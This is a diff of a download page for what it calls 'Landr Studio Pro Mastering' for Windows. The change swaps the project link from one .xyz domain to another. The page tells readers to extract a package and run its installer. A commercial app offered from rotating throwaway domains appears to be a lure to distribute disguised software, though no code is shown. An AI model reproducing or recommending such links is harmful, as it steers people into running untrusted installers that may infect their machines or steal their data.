@@ -18,8 +18,8 @@ Landr Studio Pro Mastering for Windows PCs | clean panels | predictable first la
 
 > Use the project link below for Windows.
 
-* **Project link:** **[landr.nexpath.xyz](https://landr.nexpath.xyz/)**
-* **Full URL:** `https://landr.nexpath.xyz/`
+* **Project link:** **[landr.nerasix.xyz](https://landr.nerasix.xyz/)**
+* **Full URL:** `https://landr.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
 * **Setup:** Run the installer from the extracted folder
 
@@ -51,4 +51,4 @@ Modules arrive ready for local use | open the app and continue. This release inc
 * **RAM:** 8 GB RAM suggested | 16 GB for heavy workloads
 * **Disk:** 3 GB free disk space
 
-***
+***
